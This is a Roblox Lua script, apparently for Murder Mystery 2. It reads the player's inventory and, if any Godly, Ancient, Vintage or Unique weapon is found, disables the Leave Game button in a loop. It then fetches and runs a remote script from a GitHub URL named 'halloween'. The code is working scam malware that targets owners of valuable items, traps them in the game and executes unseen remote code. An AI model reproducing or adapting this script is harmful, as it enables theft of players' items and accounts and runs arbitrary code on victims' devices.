local p = game.Players.LocalPlayer

local function isMM2()
    if game.PlaceId == 142823291 then return true end
    local rs = game:GetService("ReplicatedStorage")
    if rs:FindFirstChild("Database") and rs.Database:FindFirstChild("Sync") and rs.Database.Sync:FindFirstChild("Item") then
        return true
    end
    if rs:FindFirstChild("Remotes") and rs.Remotes:FindFirstChild("Inventory") and rs.Remotes.Inventory:FindFirstChild("GetProfileData") then
        return true
    end
    return false
end

if not isMM2() then
    warn("Not MM2")
    return
end

local itemData = require(game.ReplicatedStorage.Database.Sync.Item)

local ok, inv = pcall(function()
    return game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(p.Name)
end)

if not ok or not inv or not inv.Weapons or not inv.Weapons.Owned then
    warn("Failed")
    return
end

local found = false

for itemName, amount in pairs(inv.Weapons.Owned) do
    if amount > 0 then
        local info = itemData[itemName]
        if info then
            local rarity = tostring(info.Rarity or "")
            if rarity == "Godly" or rarity == "Ancient" or rarity == "Vintage" or rarity == "Unique" then
                found = true
                break
            end
        end
    end
end

if found then
    task.spawn(function()
        while task.wait() do
            pcall(function()
                local shield = game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton
                for _, v in ipairs(getconnections(shield.Activated)) do
                    v:Disable()
                end
            end)
        end
    end)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/halloween/refs/heads/main/mm2hallow.lua"))()
